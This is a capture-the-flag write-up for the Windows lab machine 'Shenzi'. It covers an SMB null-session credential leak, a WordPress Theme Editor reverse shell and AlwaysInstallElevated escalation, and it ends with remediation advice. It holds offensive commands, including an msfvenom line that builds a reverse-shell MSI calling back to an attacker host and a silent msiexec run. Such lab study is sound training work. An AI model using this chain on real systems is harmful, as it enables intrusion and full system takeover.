# Shenzi — Proving Grounds

| | |
|---|---|
| **Platform** | Proving Grounds (Practice) |
| **Difficulty** | Easy |
| **OS** | Windows |
| **Status** | ✅ Practice machine, no overlap with the OSCP exam pool |
| **Key techniques** | SMB null-session credential leak, WordPress Theme Editor RCE, `AlwaysInstallElevated` MSI abuse |

---

## TL;DR

Shenzi's SMB service allows a **null session**, and the one readable share
(matching a name found nowhere else yet) holds a WordPress admin password
in plaintext. That same share name doubles as the web path to the
WordPress install itself — logging in with the leaked credentials and
using the built-in **Theme Editor** to plant a PHP reverse shell gets code
execution directly. Privilege escalation is a textbook
**`AlwaysInstallElevated`** MSI abuse once winPEAS flags the registry keys.

---

## Recon & Enumeration

```bash
nmap -sCV <TARGET_IP>
```

FTP (anonymous login failing), an XAMPP default page over HTTP/HTTPS, SMB,
and MariaDB. An initial directory brute-force against the web root's
default page found nothing — a conclusion worth revisiting later.

---

## Foothold / Initial Access

SMB allowed a **null session** — no credentials needed to list and read
shares:

```bash
smbmap -H <TARGET_IP> -u null -p null -r <SHARE_NAME>
```

The share held `passwords.txt`, which contained WordPress admin credentials
directly. This raised a contradiction worth noticing: the earlier web
brute-force had turned up nothing, yet here was a working WordPress login —
meaning the earlier enumeration was incomplete, not that WordPress didn't
exist. The share's own name turned out to double as the web path
(`http://<TARGET_IP>/<share-name>/`), leading straight to the WordPress
install that the first pass had missed entirely.

Logging into WordPress with the leaked credentials gave admin access. Rather
than chasing a vulnerable plugin/theme version, the simplest path with
admin access is the built-in **Theme Editor**: editing an existing theme
file (`404.php`) directly in the browser to contain a PHP reverse shell,
saving it, then requesting any page that triggers a 404 executes the
payload:

```bash
nc -lvnp <PORT>
```

Shell landed as the web service account. User flag retrieved.

---

## Privilege Escalation

`whoami /priv` showed nothing useful. Running **winPEAS** flagged
**`AlwaysInstallElevated`** enabled in *both* `HKLM` and `HKCU` (both are
required for the abuse to work) — confirmed manually:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

With both set to `1`, any MSI installs with SYSTEM privileges regardless of
the installing user's own rights. Building a malicious MSI and running it
silently delivered a SYSTEM shell directly:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o evil.msi
```

```
msiexec /quiet /qn /i C:\temp\evil.msi
```

Root flag retrieved.

---

## Lessons Learned

- **SMB null sessions can leak real credentials, not just share/user
  names** — always enumerate share contents even when authentication
  "should" be required.
- **A later finding that contradicts an earlier conclusion means the
  earlier enumeration was incomplete** — having working WordPress
  credentials but having already decided "the web app is empty" was the
  signal to go back and look harder, not to treat both facts as
  independently true.
- **`AlwaysInstallElevated` set in both `HKLM` and `HKCU`** is a fast,
  reliable win once found — winPEAS/PrivescCheck surface it directly, no
  manual searching required.

---

## Remediation

- Disable SMB null sessions (`RestrictAnonymous`), and never place
  credentials in a plaintext file on any share regardless of its
  authentication requirements.
- Restrict WordPress Theme/Plugin Editor access, or disable file editing
  entirely (`DISALLOW_FILE_EDIT`) so admin-level compromise doesn't
  automatically mean code execution.
- Ensure `AlwaysInstallElevated` is disabled in both registry hives; it
  should never be enabled outside a tightly controlled deployment scenario.

---

**Machine:** [Proving Grounds — Shenzi](https://portal.offsec.com/labs/play)
